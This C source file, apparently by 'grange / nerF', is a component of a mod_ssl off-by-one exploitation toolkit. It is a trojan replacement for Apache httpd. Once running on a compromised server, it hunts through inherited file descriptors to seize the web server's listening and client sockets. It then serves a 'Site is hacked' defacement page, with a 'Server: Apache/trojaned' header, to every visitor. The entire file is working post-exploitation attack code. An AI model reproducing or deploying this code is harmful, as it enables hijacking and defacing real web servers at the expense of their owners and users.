
/*
 * fake-httpd.c
 * mod_ssl off-by-one bug exploitation toolkit.
 * 
 * Use this program as a replacement for apache httpd.
 *
 * grange / nerF <grange@disorder.ru>
 *
 */


#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/resource.h>

#include <netinet/in.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>

static void send_page(int, char *);

char header[] =
   "HTTP/1.0 200 OK\n"
   "Server: Apache/trojaned\n"
   "Content-Type: text/html\n";
char defpage[] =
   "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">\n"
   "<html>\n"
   "<head><title>Site is hacked</title></head>\n"
   "<body bgcolor='white'>\n"
   "<center>This site is hacked, sorry...</center>\n"
   "</body>\n"
   "</html>";

int main(int argc, char *argv[])
{
   int nofile, fd;
   struct rlimit rl;
   int ctl_sock, cln_sock;
   struct sockaddr_in sa;
   socklen_t slen;
   pid_t pid;

   if (getrlimit(RLIMIT_NOFILE, &rl) == -1)
      exit(1);
   nofile = rl.rlim_max;

   for (fd = 0; fd < nofile; fd++) {
      if (getsockname(fd, (struct sockaddr *)&sa, &slen) != -1)
         if (getpeername(fd, (struct sockaddr *)&sa,
             &slen) != -1)
            cln_sock = fd;
         else if (errno == ENOTCONN)
            ctl_sock = fd;
         else
            exit(1);
   }

   /* setproctitle("trojaned"); */

   send_page(cln_sock, defpage);
   close(cln_sock);

   for (;;) {
      if ((cln_sock = accept(ctl_sock, (struct sockaddr *)&sa,
          &slen)) == -1)
         continue;

      send_page(cln_sock, defpage);
      close(cln_sock);
   }
}

static void
send_page(s, page)
   int s;
   char *page;
{
   char buf[1024], tmp[256];

   strcpy(buf, header);
   sprintf(tmp, "Content-Length: %d\n\n", strlen(page));
   strcat(buf, tmp);

   send(s, buf, strlen(buf), 0);
   send(s, page, strlen(page), 0);
}
